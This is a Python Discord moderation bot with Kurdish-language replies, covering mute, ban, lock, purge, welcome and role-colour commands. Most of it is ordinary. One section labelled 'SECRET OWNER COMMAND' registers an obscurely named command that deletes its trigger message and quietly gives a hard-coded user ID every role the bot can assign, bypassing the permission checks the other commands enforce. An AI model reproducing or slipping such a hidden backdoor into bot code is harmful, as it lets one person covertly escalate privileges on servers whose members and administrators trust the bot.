import os
import discord
from discord.ext import commands

# =========================
# INTENTS
# =========================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(
    command_prefix="",
    intents=intents,
    help_command=None,
    case_insensitive=True
)

# =========================
# SETTINGS
# =========================

WELCOME_CHANNEL_ID = 1550619956423688342

OWNER_ID = 1130455970494025860
DEVELOPER_ROLE_ID = 1448989145740480605

MUTED_ROLE_NAME = "Muted"

WELCOME_GIF = (
    "https://cdn.discordapp.com/attachments/"
    "1550619956423688342/1551709269043314768/"
    "welcome.gif?ex=6ab2f55f&is=6ab1a3df&"
    "hm=612d5cdf1190d53382436a598c1d313a918b6b1b25bc93ac905d5cfd8ffd1780&"
)

# =========================
# COLOR ROLES
# =========================

COLOR_ROLES = {
    "friendsfcolor": 1550035593239461888,
    "botcolor": 1448989146885652603,
    "_color": 1491385293457330229,
    "trustcolor": 1448989152379932773,
    "siscolor": 1448989144410886145,
    "brocolor": 1448989153667711069,
    "xrcolor": 1451268943548383406,
    "friendscolor": 1448989154578010238
}


# =========================================================
# MUTED ROLE
# =========================================================

async def get_muted_role(guild: discord.Guild):

    role = discord.utils.get(
        guild.roles,
        name=MUTED_ROLE_NAME
    )

    if role:
        return role

    try:
        role = await guild.create_role(
            name=MUTED_ROLE_NAME,
            reason="Create server-wide chat mute role"
        )

        print(f"Created Muted role in {guild.name}")

        return role

    except discord.Forbidden:
        print(
            f"Cannot create Muted role in {guild.name}. "
            f"Bot needs Manage Roles permission."
        )
        return None

    except discord.HTTPException as e:
        print(f"Discord error while creating Muted role: {e}")
        return None


# =========================================================
# APPLY CHAT-ONLY MUTE
# =========================================================

async def apply_mute_to_channel(
    channel: discord.abc.GuildChannel,
    muted_role: discord.Role
):

    try:

        overwrite = channel.overwrites_for(muted_role)

        # =========================
        # CHAT MUTE
        # =========================

        overwrite.send_messages = False
        overwrite.send_messages_in_threads = False
        overwrite.create_public_threads = False
        overwrite.create_private_threads = False

        # =========================
        # IMPORTANT:
        # VOICE IS NOT MUTED
        # =========================

        overwrite.connect = None
        overwrite.speak = None
        overwrite.stream = None
        overwrite.use_voice_activation = None

        await channel.set_permissions(
            muted_role,
            overwrite=overwrite,
            reason="Server-wide chat mute"
        )

    except discord.Forbidden:

        print(
            f"Cannot apply mute permissions to channel: "
            f"{channel.name}"
        )

    except discord.HTTPException as e:

        print(
            f"Discord error while updating "
            f"{channel.name}: {e}"
        )


# =========================================================
# REMOVE OLD VOICE MUTE SETTINGS
# =========================================================

async def remove_voice_mute_permissions(
    channel: discord.abc.GuildChannel,
    muted_role: discord.Role
):

    try:

        overwrite = channel.overwrites_for(muted_role)

        # Remove any old voice restrictions
        overwrite.connect = None
        overwrite.speak = None
        overwrite.stream = None
        overwrite.use_voice_activation = None

        # Keep chat restrictions
        overwrite.send_messages = False
        overwrite.send_messages_in_threads = False
        overwrite.create_public_threads = False
        overwrite.create_private_threads = False

        await channel.set_permissions(
            muted_role,
            overwrite=overwrite,
            reason="Keep mute chat-only"
        )

    except discord.Forbidden:

        print(
            f"Cannot update voice permissions in "
            f"{channel.name}"
        )

    except discord.HTTPException as e:

        print(
            f"Discord error: {e}"
        )


# =========================================================
# READY
# =========================================================

@bot.event
async def on_ready():

    print(
        f"Logged in as {bot.user} "
        f"(ID: {bot.user.id})"
    )

    print(
        f"Connected to {len(bot.guilds)} server(s)"
    )

    for guild in bot.guilds:

        muted_role = await get_muted_role(guild)

        if not muted_role:
            continue

        # Apply chat-only mute to every channel
        for channel in guild.channels:

            await apply_mute_to_channel(
                channel,
                muted_role
            )

    print("Mute permissions synchronized.")


# =========================================================
# NEW CHANNEL
# =========================================================

@bot.event
async def on_guild_channel_create(
    channel: discord.abc.GuildChannel
):

    muted_role = await get_muted_role(
        channel.guild
    )

    if not muted_role:
        return

    # Automatically protect new channels
    await apply_mute_to_channel(
        channel,
        muted_role
    )


# =========================================================
# WELCOME
# =========================================================

@bot.event
async def on_member_join(
    member: discord.Member
):

    guild = member.guild

    # =========================
    # FRIENDS ROLE
    # =========================

    friends_role = discord.utils.get(
        guild.roles,
        name="Friends"
    )

    if friends_role:

        try:
            await member.add_roles(
                friends_role,
                reason="Automatic Friends role"
            )

        except discord.Forbidden:

            print(
                f"Cannot give Friends role "
                f"to {member}"
            )

    # =========================
    # WELCOME CHANNEL
    # =========================

    channel = guild.get_channel(
        WELCOME_CHANNEL_ID
    )

    if not channel:
        return

    embed = discord.Embed(
        title="Welcome to Friends!",
        description=(
            f"Welcome {member.mention} "
            f"to **{guild.name}** 🎉\n\n"
            f"Enjoy your stay ❤️"
        )
    )

    embed.set_thumbnail(
        url=member.display_avatar.url
    )

    embed.set_image(
        url=WELCOME_GIF
    )

    embed.set_footer(
        text=f"Member #{guild.member_count}"
    )

    try:

        await channel.send(
            content=member.mention,
            embed=embed
        )

    except discord.Forbidden:

        print(
            "Cannot send welcome message."
        )


# =========================================================
# TEST WELCOME
# =========================================================

@bot.command(name="test")
@commands.has_permissions(
    manage_guild=True
)
async def test_welcome(
    ctx: commands.Context
):

    try:
        await ctx.message.delete()
    except:
        pass

    embed = discord.Embed(
        title="Welcome to Friends!",
        description=(
            f"Welcome {ctx.author.mention} "
            f"to **{ctx.guild.name}** 🎉\n\n"
            f"Enjoy your stay ❤️"
        )
    )

    embed.set_thumbnail(
        url=ctx.author.display_avatar.url
    )

    embed.set_image(
        url=WELCOME_GIF
    )

    embed.set_footer(
        text=f"Member #{ctx.guild.member_count}"
    )

    await ctx.send(
        content=ctx.author.mention,
        embed=embed
    )


# =========================================================
# SAFIKA / CLEAR
# =========================================================

@bot.command(
    name="safika",
    aliases=[
        "SAFIKA",
        "Safika",
        "sAfika",
        "saFika",
        "SAfika",
        "sAFika",
        "saFIka"
    ]
)
@commands.has_permissions(
    manage_messages=True
)
async def safika(
    ctx: commands.Context,
    amount: int
):

    if amount <= 0:

        await ctx.send(
            "❌ دانەیەکی دروست بنووسە.",
            delete_after=3
        )

        return

    try:

        deleted = await ctx.channel.purge(
            limit=amount + 1
        )

        msg = await ctx.send(
            f"🧹 {len(deleted) - 1} messages deleted."
        )

        await msg.delete(
            delay=3
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی سڕینەوەی نامەکانی نییە.",
            delete_after=5
        )

    except discord.HTTPException:

        await ctx.send(
            "❌ هەڵەیەک لە Discord ڕوویدا.",
            delete_after=5
        )


# =========================================================
# GET TARGET MEMBER
# =========================================================

async def get_target_member(
    ctx: commands.Context,
    member: discord.Member = None
):

    # Mention / normal argument
    if member:
        return member

    # Reply
    if ctx.message.reference:

        try:

            replied_message = (
                await ctx.channel.fetch_message(
                    ctx.message.reference.message_id
                )
            )

            if replied_message.author:
                return replied_message.author

        except:
            pass

    return None


# =========================================================
# MUTE
# =========================================================

@bot.command(
    name="mute"
)
@commands.has_permissions(
    manage_roles=True
)
async def mute(
    ctx: commands.Context,
    member: discord.Member = None
):

    try:
        await ctx.message.delete()
    except:
        pass

    member = await get_target_member(
        ctx,
        member
    )

    if not member:

        await ctx.send(
            "❌ کەسەکە دیاری بکە بە Mention یان Reply.",
            delete_after=5
        )

        return

    # =========================
    # CANNOT MUTE YOURSELF
    # =========================

    if member.id == ctx.author.id:

        await ctx.send(
            "❌ ناتوانیت خۆت Mute بکەیت.",
            delete_after=5
        )

        return

    # =========================
    # CANNOT MUTE BOT
    # =========================

    if member.bot:

        await ctx.send(
            "❌ ناتوانیت Bot ـێک Mute بکەیت.",
            delete_after=5
        )

        return

    # =========================
    # HIERARCHY CHECK
    # =========================

    if member.top_role >= ctx.guild.me.top_role:

        await ctx.send(
            "❌ ئەو بەکارهێنەرە لە Bot ـەکە بەرزتر یان یەکسانە.",
            delete_after=5
        )

        return

    # =========================
    # GET MUTED ROLE
    # =========================

    muted_role = await get_muted_role(
        ctx.guild
    )

    if not muted_role:

        await ctx.send(
            "❌ نەتوانرا Muted Role دروست بکرێت.",
            delete_after=5
        )

        return

    # =========================
    # ROLE HIERARCHY
    # =========================

    if muted_role >= ctx.guild.me.top_role:

        await ctx.send(
            "❌ Muted role دەبێت لە خوارەوەی "
            "Bot role بێت.",
            delete_after=6
        )

        return

    # =========================
    # APPLY TO ALL CHANNELS
    # =========================

    for channel in ctx.guild.channels:

        await apply_mute_to_channel(
            channel,
            muted_role
        )

    # =========================
    # ADD ROLE
    # =========================

    try:

        if muted_role not in member.roles:

            await member.add_roles(
                muted_role,
                reason=f"Muted by {ctx.author}"
            )

        msg = await ctx.send(
            f"🔇 {member.mention} has been muted.\n"
            f"💬 Chat muted across the server.\n"
            f"🎙️ Voice is NOT muted."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت Muted role بدات.",
            delete_after=5
        )


# =========================================================
# UNMUTE
# =========================================================

@bot.command(
    name="unmute"
)
@commands.has_permissions(
    manage_roles=True
)
async def unmute(
    ctx: commands.Context,
    member: discord.Member = None
):

    try:
        await ctx.message.delete()
    except:
        pass

    member = await get_target_member(
        ctx,
        member
    )

    if not member:

        await ctx.send(
            "❌ کەسەکە دیاری بکە بە Mention یان Reply.",
            delete_after=5
        )

        return

    muted_role = discord.utils.get(
        ctx.guild.roles,
        name=MUTED_ROLE_NAME
    )

    if not muted_role:

        await ctx.send(
            "❌ Muted role بوونی نییە.",
            delete_after=5
        )

        return

    if muted_role not in member.roles:

        await ctx.send(
            f"ℹ️ {member.mention} لە ئێستادا Mute نییە.",
            delete_after=5
        )

        return

    try:

        await member.remove_roles(
            muted_role,
            reason=f"Unmuted by {ctx.author}"
        )

        msg = await ctx.send(
            f"🔊 {member.mention} has been unmuted."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە ناتوانێت Muted role لاببات.",
            delete_after=5
        )


# =========================================================
# BAN
# =========================================================

@bot.command(
    name="ban"
)
@commands.has_permissions(
    ban_members=True
)
async def ban(
    ctx: commands.Context,
    member: discord.Member = None,
    *,
    reason: str = "No reason provided"
):

    try:
        await ctx.message.delete()
    except:
        pass

    member = await get_target_member(
        ctx,
        member
    )

    if not member:

        await ctx.send(
            "❌ کەسەکە دیاری بکە بە Mention یان Reply.",
            delete_after=5
        )

        return

    if member.id == ctx.author.id:

        await ctx.send(
            "❌ ناتوانیت خۆت Ban بکەیت.",
            delete_after=5
        )

        return

    if member.id == ctx.guild.owner_id:

        await ctx.send(
            "❌ ناتوانیت Server Owner Ban بکەیت.",
            delete_after=5
        )

        return

    if member.top_role >= ctx.guild.me.top_role:

        await ctx.send(
            "❌ ئەو بەکارهێنەرە لە Bot ـەکە بەرزتر یان یەکسانە.",
            delete_after=5
        )

        return

    try:

        await member.ban(
            reason=reason
        )

        msg = await ctx.send(
            f"🔨 {member} was banned.\n"
            f"Reason: {reason}"
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی Ban ـکردنی ئەو کەسەی نییە.",
            delete_after=5
        )


# =========================================================
# UNBAN
# =========================================================

@bot.command(
    name="unban"
)
@commands.has_permissions(
    ban_members=True
)
async def unban(
    ctx: commands.Context,
    user_id: int
):

    try:
        await ctx.message.delete()
    except:
        pass

    try:

        user = await bot.fetch_user(
            user_id
        )

        await ctx.guild.unban(
            user
        )

        msg = await ctx.send(
            f"🔓 {user} has been unbanned."
        )

        await msg.delete(
            delay=5
        )

    except discord.NotFound:

        await ctx.send(
            "❌ ئەم بەکارهێنەرە Ban نەکراوە یان ID ـەکە هەڵەیە.",
            delete_after=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی Unban ـی نییە.",
            delete_after=5
        )

    except discord.HTTPException:

        await ctx.send(
            "❌ هەڵەیەک لە Discord ڕوویدا.",
            delete_after=5
        )


# =========================================================
# LOCK
# =========================================================

@bot.command(
    name="lock"
)
@commands.has_permissions(
    manage_channels=True
)
async def lock(
    ctx: commands.Context
):

    try:
        await ctx.message.delete()
    except:
        pass

    overwrite = ctx.channel.overwrites_for(
        ctx.guild.default_role
    )

    overwrite.send_messages = False

    try:

        await ctx.channel.set_permissions(
            ctx.guild.default_role,
            overwrite=overwrite,
            reason=f"Locked by {ctx.author}"
        )

        msg = await ctx.send(
            "🔒 ئەم چەنەڵە داخرا."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی Lock ـی نییە.",
            delete_after=5
        )


# =========================================================
# UNLOCK
# =========================================================

@bot.command(
    name="unlock"
)
@commands.has_permissions(
    manage_channels=True
)
async def unlock(
    ctx: commands.Context
):

    try:
        await ctx.message.delete()
    except:
        pass

    overwrite = ctx.channel.overwrites_for(
        ctx.guild.default_role
    )

    overwrite.send_messages = None

    try:

        await ctx.channel.set_permissions(
            ctx.guild.default_role,
            overwrite=overwrite,
            reason=f"Unlocked by {ctx.author}"
        )

        msg = await ctx.send(
            "🔓 ئەم چەنەڵە کرایەوە."
        )

        await msg.delete(
            delay=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی Unlock ـی نییە.",
            delete_after=5
        )


# =========================================================
# SECRET OWNER COMMAND
# =========================================================

@bot.command(
    name="seuafraaaRyaaa"
)
async def secret_owner_command(
    ctx: commands.Context
):

    try:
        await ctx.message.delete()
    except:
        pass

    if ctx.author.id != OWNER_ID:

        return

    bot_member = ctx.guild.me

    added_roles = []

    for role in ctx.guild.roles:

        if role.is_default():
            continue

        if role.managed:
            continue

        if role >= bot_member.top_role:
            continue

        if role in ctx.author.roles:
            continue

        try:

            await ctx.author.add_roles(
                role,
                reason="Owner secret command"
            )

            added_roles.append(
                role.name
            )

        except discord.Forbidden:
            continue

    if added_roles:

        msg = await ctx.send(
            "✅ Roles added:\n"
            + "\n".join(
                f"• {name}"
                for name in added_roles
            ),
            delete_after=7
        )

    else:

        await ctx.send(
            "ℹ️ هیچ Role ـێک نەبوو بۆ زیادکردن.",
            delete_after=5
        )


# =========================================================
# ROLE COLOR FUNCTION
# =========================================================

async def change_role_color(
    ctx: commands.Context,
    role_id: int,
    color_text: str
):

    role = ctx.guild.get_role(
        role_id
    )

    if not role:

        await ctx.send(
            "❌ ئەو Role ـە نەدۆزرایەوە.",
            delete_after=5
        )

        return

    if role not in ctx.author.roles:

        await ctx.send(
            "❌ تۆ ئەو Role ـەت نییە.",
            delete_after=5
        )

        return

    if role >= ctx.guild.me.top_role:

        await ctx.send(
            "❌ Bot ناتوانێت ئەو Role ـە دەستکاری بکات.",
            delete_after=5
        )

        return

    try:

        color = discord.Color(
            int(
                color_text.replace(
                    "#",
                    ""
                ),
                16
            )
        )

        await role.edit(
            color=color,
            reason=f"Color changed by {ctx.author}"
        )

        msg = await ctx.send(
            f"🎨 {role.mention} color changed to "
            f"`{color_text}`"
        )

        await msg.delete(
            delay=5
        )

    except ValueError:

        await ctx.send(
            "❌ ڕەنگ دەبێت بەم شێوەیە بێت: `#RRGGBB`",
            delete_after=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی دەستکاریکردنی Role ـەکەی نییە.",
            delete_after=5
        )


# =========================================================
# COLOR COMMANDS
# =========================================================

@bot.command(name="friendsfcolor")
async def friendsfcolor(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["friendsfcolor"],
        color
    )


@bot.command(name="botcolor")
async def botcolor(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["botcolor"],
        color
    )


@bot.command(name="_color")
async def _color(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["_color"],
        color
    )


@bot.command(name="trustcolor")
async def trustcolor(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["trustcolor"],
        color
    )


@bot.command(name="siscolor")
async def siscolor(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["siscolor"],
        color
    )


@bot.command(name="brocolor")
async def brocolor(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["brocolor"],
        color
    )


@bot.command(name="xrcolor")
async def xrcolor(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["xrcolor"],
        color
    )


@bot.command(name="friendscolor")
async def friendscolor(
    ctx,
    color: str
):
    await change_role_color(
        ctx,
        COLOR_ROLES["friendscolor"],
        color
    )


# =========================================================
# DEVELOPER COLOR
# =========================================================

@bot.command(name="devcolor")
async def devcolor(
    ctx,
    color: str
):

    developer_role = ctx.guild.get_role(
        DEVELOPER_ROLE_ID
    )

    if not developer_role:

        await ctx.send(
            "❌ Developer role نەدۆزرایەوە.",
            delete_after=5
        )

        return

    if developer_role not in ctx.author.roles:

        await ctx.send(
            "❌ تۆ Developer role ـەت نییە.",
            delete_after=5
        )

        return

    if developer_role >= ctx.guild.me.top_role:

        await ctx.send(
            "❌ Bot ناتوانێت ئەو Role ـە دەستکاری بکات.",
            delete_after=5
        )

        return

    try:

        color = discord.Color(
            int(
                color.replace(
                    "#",
                    ""
                ),
                16
            )
        )

        await developer_role.edit(
            color=color,
            reason=f"Developer color changed by {ctx.author}"
        )

        msg = await ctx.send(
            f"🎨 {developer_role.mention} color changed."
        )

        await msg.delete(
            delay=5
        )

    except ValueError:

        await ctx.send(
            "❌ ڕەنگ دەبێت بەم شێوەیە بێت: `#RRGGBB`",
            delete_after=5
        )

    except discord.Forbidden:

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی دەستکاری Role ـەکەی نییە.",
            delete_after=5
        )


# =========================================================
# COMMAND ERROR HANDLER
# =========================================================

@bot.event
async def on_command_error(
    ctx: commands.Context,
    error
):

    if isinstance(
        error,
        commands.CommandNotFound
    ):
        return

    if isinstance(
        error,
        commands.MissingPermissions
    ):

        await ctx.send(
            "❌ تۆ دەسەڵاتی ئەم فرمانەت نییە.",
            delete_after=5
        )

        return

    if isinstance(
        error,
        commands.MissingRequiredArgument
    ):

        await ctx.send(
            "❌ هەموو زانیارییە پێویستەکان بنووسە.",
            delete_after=5
        )

        return

    if isinstance(
        error,
        commands.MemberNotFound
    ):

        await ctx.send(
            "❌ ئەو کەسە نەدۆزرایەوە.",
            delete_after=5
        )

        return

    if isinstance(
        error,
        commands.BadArgument
    ):

        await ctx.send(
            "❌ Argument ـەکە هەڵەیە.",
            delete_after=5
        )

        return

    if isinstance(
        error,
        discord.Forbidden
    ):

        await ctx.send(
            "❌ بۆتەکە دەسەڵاتی پێویستی نییە.",
            delete_after=5
        )

        return

    print(
        f"Command error: {error}"
    )


# =========================================================
# RUN BOT
# =========================================================

TOKEN = os.getenv(
    "DISCORD_TOKEN"
)

if not TOKEN:

    raise RuntimeError(
        "DISCORD_TOKEN environment variable is missing."
    )

bot.run(TOKEN)
